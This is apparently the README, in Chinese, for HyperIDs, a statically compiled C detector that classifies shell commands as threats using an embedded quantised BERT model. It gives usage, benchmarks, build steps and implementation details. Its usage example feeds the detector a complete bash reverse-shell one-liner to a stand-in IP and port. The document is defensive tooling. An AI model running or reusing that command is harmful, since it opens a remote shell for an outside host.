# HyperIDs — 单二进制静态编译版

所有内容（模型权重 / 词表 / 标签与 MITRE 规则）都编译进**一个静态链接的 C 二进制**。
只需这一个二进制即可完成 shell 命令威胁检测，无任何运行时依赖（无 ONNX Runtime、无 Python、无 .so）。

## 产物

| 项 | 值 |
|---|---|
| 二进制 | `hyperids`（约 18.4MB，per-channel int8 权重内嵌） |
| 链接 | **statically linked** |
| 峰值 RSS | 约 27–38 MiB（未执行候选命令，仅模型前向） |
| 推理速度 | 基础版单线程 ~166 ms/条；OpenMP 版 `make all_omp` 本机 4 线程 ~74 ms/条、8 线程 ~106 ms/条（AVX2 + FMA；8 线程对短序列反而回退） |
| 模型 | GLiClass uni-encoder + `prajjwal1/bert-small`（29.8M，4 层 / 512 维 / 8 头） |
| 标签 | verdict 3（benign/suspicious/malicious）+ action 28 = 31；MITRE 由规则推导 |

## 用法

```bash
./hyperids 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
./hyperids -            # stdin 逐行（每行一条命令，输出 verdict）
./hyperids --json '...' # JSON 输出
```

输出示例：

```
verdict   : malicious
verdict_probs: benign=0.0000 suspicious=0.0000 malicious=1.0000
actions   : command_and_control, reverse_shell
tactics   : command_and_control, initial_access
techniques: T1059, T1071
```

## 与 Python 推理的对齐

输入构造与 `hyperids/predict.py` / `tools/eval_private_frozen.py` 对齐：标签前缀**不含 `[CLS]`**，
命令后追加一个 `[SEP]`。`export_c_labels.py` 已按此口径生成 `hyperids_labels.h`。

C 引擎（per-channel int8）与 PyTorch fp32 在私有冻结集 80 条抽样上：
- verdict：80/80 一致；
- actions：76/80 完全一致，剩余 4 条为 `action.system_probe` 概率恰在 0.50 阈值附近
  （PyTorch 约 0.504 vs C int8 约 0.499），属于 int8 量化边界翻转，不是前向逻辑错误。

verdict = softmax(argmax)，action = sigmoid(≥0.5)，MITRE = `schema.derive_attck(actions)` 规则表确定性推导。

## 从源码构建

```bash
# 基础版
make

# OpenMP 优化版（多线程 GEMM，单二进制不变）
make all_omp

# 1) 导出权重（fp32 + per-channel int8）+ vocab + 标签表
PYTHONPATH=. python deploy/c_runtime/export_c_weights_v9.py
PYTHONPATH=. python deploy/c_runtime/export_c_labels.py

# 2) 静态编译（ld -r -b binary 嵌入 int8 权重/vocab）
cd deploy/c_runtime && make            # 产物 build/hyperids（AVX2 + FMA）
make all_omp                           # OpenMP 优化版
make STATIC=0                          # 若需动态链接 libc 的版本
```

构建依赖：`cc`（gcc/clang）、`ld`（binutils）、`make`；OpenMP 版额外需要 `-fopenmp`。无 ONNX/Python 依赖。
x86 下默认启用 AVX2/FMA；ARM/MIPS 等平台自动回退到纯标量实现（可编译，但未做 NEON 优化，速度明显慢）。

ARM 交叉编译示例（需自行准备工具链与 libc）：

```bash
make CC=aarch64-linux-gnu-gcc      CFLAGS='-O3 -mcpu=cortex-a53'      OMP_CFLAGS='-O3 -mcpu=cortex-a53 -fopenmp'
```

## 实现说明

- 推理引擎为纯 C：BERT self-attention + FFN(gelu) + 2 个 GLiClass projector + 点积 scorer。
- 权重 per-channel int8 量化（2D 矩阵），LayerNorm/bias 保持 fp32；`mm` 为 block 化 int8 GEMM
  （MC=64 / NC=128 / KC=128），相比朴素 s,n,k 循环减少 L1/L2 重复读取。
- x86 启用 AVX2+FMA kernel；非 x86 使用同逻辑的标量 fallback，保证可交叉编译到 ARM/MIPS。
- WordPiece tokenizer 为纯 C 实现（basic tokenization + 贪心最长匹配 + `##` 子词 + UTF-8 序列）。
- 权重布局与导出顺序见 `export_c_weights.py`，C 端 `load_model_mem` 按同序读取。
- 标签前缀 token / class 位置 / MITRE 位图由 `export_c_labels.py` 生成 `hyperids_labels.h`。
